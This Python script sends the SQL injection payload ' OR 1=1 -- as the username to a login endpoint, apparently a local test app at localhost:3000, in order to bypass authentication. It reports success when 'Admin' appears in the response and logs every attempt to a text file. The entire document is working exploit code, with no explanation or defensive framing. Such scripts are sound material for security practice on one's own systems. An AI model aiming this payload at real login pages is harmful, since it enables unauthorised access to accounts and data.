import requests
from datetime import datetime

# Target login URL
url = "http://localhost:3000/login"

# SQL Injection payload
injected_username = "' OR 1=1 -- "
fake_password = "YOU_CAN_ENTER_ANYTHING_HERE"

# Data to be sent in POST request
data = {
    "username": injected_username,
    "password": fake_password
}

# readable timestamp
timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# start of injection attempt
print(f"[+] SENDING SQL INJECTION PAYLOAD... AT {timestamp}")

# Send request
response = requests.post(url, data=data)

# Determine result
if "Admin" in response.text or "admin" in response.text:
    status = "SUCCESS"
    print(f"[+] SQL INJECTION BYPASSED SUCCESSFULLY! ACCESS GRANTED AT {timestamp}")
elif "Login failed" in response.text:
    status = "FAILED"
    print(f"[-] INJECTION FAILED! ACCESS DENIED AT {timestamp}")
else:
    status = "UNKNOWN"
    print(f"[!] UNEXPECTED SERVER RESPONSE AT {timestamp}")

# Log the attempt
login_entry = f"{timestamp} | Username: {data['username']} | Password: {data['password']} | Status: {status}\n"

with open("Loginattempts.txt", "a") as log_file:
    log_file.write(login_entry)